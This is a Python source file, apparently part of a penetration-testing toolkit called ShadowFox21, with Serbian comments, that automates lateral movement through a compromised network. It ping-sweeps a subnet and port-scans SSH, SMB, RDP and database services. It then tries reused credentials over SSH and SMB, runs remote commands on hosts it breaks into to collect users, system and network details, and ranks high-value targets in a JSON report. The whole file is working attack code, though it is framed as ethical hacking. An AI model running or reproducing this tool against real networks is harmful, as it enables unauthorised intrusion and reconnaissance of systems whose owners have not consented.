
#!/usr/bin/env python3
"""
ShadowFox21 - Lateral Movement Module
====================================
APT-style lateral movement simulation za etičko hakovanje
Horizontalno i vertikalno širenje kroz kompromitovanu mrežu
"""

import json
import time
import threading
import subprocess
import socket
import struct
import paramiko
import argparse
from datetime import datetime
from pathlib import Path
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
import ipaddress
import random
import base64

class LateralMovement:
    def __init__(self, initial_host, credentials, network_range=None, threads=20):
        self.initial_host = initial_host
        self.credentials = credentials  # {'username': 'admin', 'password': 'pass123'}
        self.network_range = network_range or self.detect_network_range()
        self.threads = threads
        
        # Movement state
        self.compromised_hosts = {initial_host: {'method': 'initial', 'creds': credentials}}
        self.discovered_hosts = set()
        self.active_sessions = {}
        self.movement_chain = []
        self.failed_attempts = []
        self.gathered_intel = {}
        
        # Threading
        self.scan_queue = Queue()
        self.attack_queue = Queue()
        self.lock = threading.Lock()
        
        # Attack methods
        self.attack_methods = ['ssh', 'smb', 'rdp', 'winrm', 'mysql', 'postgres']
        
        print(f"🎯 Lateral Movement inicijalizovan")
        print(f"📍 Initial host: {initial_host}")
        print(f"🔑 Credentials: {credentials['username']}:{credentials['password']}")
        print(f"🌐 Network range: {network_range}")

    def detect_network_range(self):
        """Automatski detektuje network range na bazi initial host-a"""
        try:
            # Parsira initial host i pravi /24 subnet
            ip = ipaddress.ip_address(self.initial_host)
            if ip.version == 4:
                network = ipaddress.ip_network(f"{ip}/24", strict=False)
                return str(network)
        except:
            pass
        return "192.168.1.0/24"  # default

    def ping_sweep(self, network):
        """Host discovery kroz ping sweep"""
        print(f"🔍 Ping sweep: {network}")
        alive_hosts = []
        
        try:
            network_obj = ipaddress.ip_network(network)
            hosts_to_scan = list(network_obj.hosts())
            
            # Ping sweep sa threading
            def ping_host(host):
                try:
                    # Linux/Mac ping
                    result = subprocess.run(
                        ['ping', '-c', '1', '-W', '1', str(host)],
                        capture_output=True, text=True, timeout=2
                    )
                    if result.returncode == 0:
                        return str(host)
                except:
                    try:
                        # Windows ping
                        result = subprocess.run(
                            ['ping', '-n', '1', '-w', '1000', str(host)],
                            capture_output=True, text=True, timeout=2
                        )
                        if result.returncode == 0:
                            return str(host)
                    except:
                        pass
                return None
            
            # Multi-threaded ping
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = [executor.submit(ping_host, host) for host in hosts_to_scan]
                for future in futures:
                    result = future.result()
                    if result:
                        alive_hosts.append(result)
            
            print(f"✅ Pronađeno {len(alive_hosts)} živih hostova")
            return alive_hosts
            
        except Exception as e:
            print(f"❌ Ping sweep greška: {e}")
            return []

    def port_scan(self, host, ports=[22, 23, 135, 139, 445, 3389, 5985, 3306, 5432]):
        """Brzi port scan za važne servise"""
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        return open_ports

    def attempt_ssh_login(self, host, username, password):
        """Pokušaj SSH login-a"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, username=username, password=password, timeout=5)
            
            # Test komanda
            stdin, stdout, stderr = client.exec_command('whoami')
            result = stdout.read().decode().strip()
            
            if result:
                self.active_sessions[host] = {
                    'type': 'ssh',
                    'client': client,
                    'username': username
                }
                return True, f"SSH success as: {result}"
            
        except Exception as e:
            return False, str(e)
        
        return False, "SSH connection failed"

    def attempt_smb_login(self, host, username, password):
        """Pokušaj SMB login-a"""
        try:
            # Koristi smbclient ili impacket
            cmd = f"smbclient -L //{host} -U {username}%{password} -N"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0 and "Sharename" in result.stdout:
                return True, "SMB access successful"
            else:
                return False, "SMB access denied"
                
        except Exception as e:
            return False, str(e)

    def attempt_rdp_check(self, host):
        """Proverava da li je RDP dostupan"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((host, 3389))
            sock.close()
            
            if result == 0:
                return True, "RDP port open"
            else:
                return False, "RDP port closed"
        except:
            return False, "RDP check failed"

    def execute_remote_command(self, host, command):
        """Izvršava komandu na remote host-u"""
        if host in self.active_sessions:
            session = self.active_sessions[host]
            
            try:
                if session['type'] == 'ssh':
                    client = session['client']
                    stdin, stdout, stderr = client.exec_command(command)
                    output = stdout.read().decode().strip()
                    error = stderr.read().decode().strip()
                    
                    return {
                        'success': True,
                        'output': output,
                        'error': error
                    }
            except Exception as e:
                return {
                    'success': False,
                    'error': str(e)
                }
        
        return {'success': False, 'error': 'No active session'}

    def gather_host_intel(self, host):
        """Prikuplja informacije o kompromitovanom host-u"""
        intel = {
            'hostname': '',
            'os_info': '',
            'users': [],
            'network_info': '',
            'processes': [],
            'files_of_interest': []
        }
        
        if host not in self.active_sessions:
            return intel
        
        commands = {
            'hostname': 'hostname',
            'os_info': 'uname -a || systeminfo',
            'users': 'cat /etc/passwd | cut -d: -f1 || net user',
            'network_info': 'ip addr || ipconfig',
            'processes': 'ps aux || tasklist'
        }
        
        for key, cmd in commands.items():
            result = self.execute_remote_command(host, cmd)
            if result['success']:
                intel[key] = result['output'][:500]  # Ograniči output
        
        return intel

    def credential_reuse_attack(self, target_host):
        """Pokušava credential reuse na target host-u"""
        results = []
        username = self.credentials['username']
        password = self.credentials['password']
        
        # Port scan prvo
        open_ports = self.port_scan(target_host)
        
        attack_results = {
            'host': target_host,
            'open_ports': open_ports,
            'attempts': []
        }
        
        # SSH (port 22)
        if 22 in open_ports:
            success, message = self.attempt_ssh_login(target_host, username, password)
            attack_results['attempts'].append({
                'method': 'ssh',
                'success': success,
                'message': message
            })
            
            if success:
                with self.lock:
                    self.compromised_hosts[target_host] = {
                        'method': 'ssh_lateral',
                        'creds': self.credentials,
                        'from_host': self.initial_host
                    }
                    
                    # Prikuplja intel
                    intel = self.gather_host_intel(target_host)
                    self.gathered_intel[target_host] = intel
                
                print(f"🚨 LATERAL SUCCESS: {target_host} via SSH")
        
        # SMB (port 445)
        if 445 in open_ports:
            success, message = self.attempt_smb_login(target_host, username, password)
            attack_results['attempts'].append({
                'method': 'smb',
                'success': success,
                'message': message
            })
            
            if success:
                print(f"🚨 SMB ACCESS: {target_host}")
        
        # RDP (port 3389)
        if 3389 in open_ports:
            success, message = self.attempt_rdp_check(target_host)
            attack_results['attempts'].append({
                'method': 'rdp_check',
                'success': success,
                'message': message
            })
        
        return attack_results

    def lateral_movement_worker(self):
        """Worker za lateral movement napade"""
        while True:
            try:
                target_host = self.attack_queue.get(timeout=5)
                
                # Skip ako je već kompromitovan
                if target_host in self.compromised_hosts:
                    self.attack_queue.task_done()
                    continue
                
                print(f"🎯 Attacking: {target_host}")
                result = self.credential_reuse_attack(target_host)
                
                with self.lock:
                    self.movement_chain.append(result)
                    
                    # Ako je neuspešno, dodaje u failed
                    if not any(attempt['success'] for attempt in result['attempts']):
                        self.failed_attempts.append(result)
                
                self.attack_queue.task_done()
                time.sleep(0.5)  # Rate limiting
                
            except:
                break

    def run_lateral_movement(self):
        """Pokreće lateral movement proces"""
        print(f"\n🚀 Početak lateral movement operacije...")
        start_time = time.time()
        
        # 1. Host Discovery
        print(f"\n📡 Phase 1: Host Discovery")
        discovered_hosts = self.ping_sweep(self.network_range)
        self.discovered_hosts = set(discovered_hosts)
        
        # Uklanja initial host iz liste
        self.discovered_hosts.discard(self.initial_host)
        
        if not self.discovered_hosts:
            print("❌ Nema hostova za napad!")
            return False
        
        print(f"✅ Otkriveno {len(self.discovered_hosts)} potencijalnih meta")
        
        # 2. Lateral Movement Attacks
        print(f"\n🎯 Phase 2: Credential Reuse & Lateral Movement")
        
        # Puni attack queue
        for host in self.discovered_hosts:
            self.attack_queue.put(host)
        
        # Kreira worker threads
        threads = []
        for i in range(min(self.threads, len(self.discovered_hosts))):
            t = threading.Thread(target=self.lateral_movement_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Čeka da se završi
        self.attack_queue.join()
        
        # 3. Post-exploitation Intel Gathering
        print(f"\n🕵️  Phase 3: Intelligence Gathering")
        for host in self.compromised_hosts:
            if host != self.initial_host:
                intel = self.gather_host_intel(host)
                self.gathered_intel[host] = intel
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n✅ Lateral Movement završen za {duration:.2f} sekundi")
        print(f"📊 Rezultati:")
        print(f"   • Otkriveno hostova: {len(self.discovered_hosts)}")
        print(f"   • Kompromitovano hostova: {len(self.compromised_hosts)}")
        print(f"   • Neuspešni napadi: {len(self.failed_attempts)}")
        print(f"   • Aktivne sesije: {len(self.active_sessions)}")
        
        return True

    def setup_pivot(self, host, local_port=1080):
        """Postavlja SOCKS proxy za pivoting"""
        if host in self.active_sessions and self.active_sessions[host]['type'] == 'ssh':
            try:
                # SSH Dynamic port forwarding
                ssh_client = self.active_sessions[host]['client']
                transport = ssh_client.get_transport()
                
                # Ovo je simplified - pravi SOCKS proxy bi trebao kompletniju implementaciju
                print(f"🔄 SOCKS proxy setup attempted for {host}:{local_port}")
                return True
            except Exception as e:
                print(f"❌ Pivot setup failed: {e}")
                return False
        return False

    def generate_movement_report(self):
        """Generiše detaljni izveštaj lateral movement-a"""
        report = {
            'module': 'lateral_movement',
            'operation_info': {
                'timestamp': datetime.now().isoformat(),
                'initial_host': self.initial_host,
                'network_range': self.network_range,
                'credentials_used': {
                    'username': self.credentials['username'],
                    'password': '***masked***'  # Bezbednost
                }
            },
            'discovery_phase': {
                'total_hosts_discovered': len(self.discovered_hosts),
                'discovered_hosts': sorted(list(self.discovered_hosts))
            },
            'compromise_results': {
                'total_compromised': len(self.compromised_hosts),
                'compromised_hosts': self.compromised_hosts,
                'active_sessions': len(self.active_sessions),
                'success_rate': len(self.compromised_hosts) / max(len(self.discovered_hosts), 1) * 100
            },
            'attack_chain': self.movement_chain,
            'failed_attempts': self.failed_attempts,
            'intelligence_gathered': self.gathered_intel,
            'recommendations': {
                'pivot_candidates': list(self.active_sessions.keys()),
                'high_value_targets': [host for host, info in self.gathered_intel.items() 
                                     if 'admin' in info.get('users', '') or 'root' in info.get('users', '')],
                'next_phase_ready': len(self.compromised_hosts) > 1
            }
        }
        
        return report

    def save_report(self, filename=None):
        """Čuva JSON izveštaj"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"shadowfox_lateral_movement_{timestamp}.json"
        
        report = self.generate_movement_report()
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n💾 Lateral Movement izveštaj sačuvan: {filename}")
        return filename

    def cleanup_sessions(self):
        """Zatvara sve aktivne sesije"""
        for host, session in self.active_sessions.items():
            try:
                if session['type'] == 'ssh':
                    session['client'].close()
            except:
                pass
        print("🔒 Sve sesije zatvorene")

def load_credentials_from_json(json_file):
    """Učitava credentials iz prethodnih modula"""
    try:
        with open(json_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        # Traži credentials u različitim formatima
        creds = None
        
        # Iz SQLi results
        if 'mutations_ready' in data:
            for mutation in data['mutations_ready']:
                if 'credentials' in mutation:
                    return mutation['credentials']
        
        # Default test credentials
        return {'username': 'admin', 'password': 'password123'}
        
    except Exception as e:
        print(f"⚠️  Greška pri učitavanju credentials: {e}")
        return {'username': 'admin', 'password': 'password123'}

def main():
    parser = argparse.ArgumentParser(description='ShadowFox21 - Lateral Movement Module')
    parser.add_argument('initial_host', help='Initial compromised host IP')
    parser.add_argument('-u', '--username', default='admin', help='Username for attacks')
    parser.add_argument('-p', '--password', default='password123', help='Password for attacks')
    parser.add_argument('-n', '--network', help='Network range (e.g., 192.168.1.0/24)')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads')
    parser.add_argument('--input-json', help='Load credentials from previous module JSON')
    parser.add_argument('-o', '--output', help='Output JSON file')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🔥 ShadowFox21 - Lateral Movement Module")
    print("=" * 60)
    
    # Učitava credentials
    if args.input_json and Path(args.input_json).exists():
        credentials = load_credentials_from_json(args.input_json)
    else:
        credentials = {'username': args.username, 'password': args.password}
    
    # Kreira lateral movement instancu
    lateral = LateralMovement(
        initial_host=args.initial_host,
        credentials=credentials,
        network_range=args.network,
        threads=args.threads
    )
    
    try:
        # Pokreće lateral movement
        if lateral.run_lateral_movement():
            # Čuva izveštaj
            lateral.save_report(args.output)
            print(f"\n🎯 Lateral Movement završen uspešno!")
        else:
            print(f"\n❌ Lateral Movement neuspešan!")
        
    except KeyboardInterrupt:
        print(f"\n⚠️  Operacija prekinuta...")
    except Exception as e:
        print(f"\n❌ Greška: {e}")
    finally:
        lateral.cleanup_sessions()

if __name__ == "__main__":
    main()

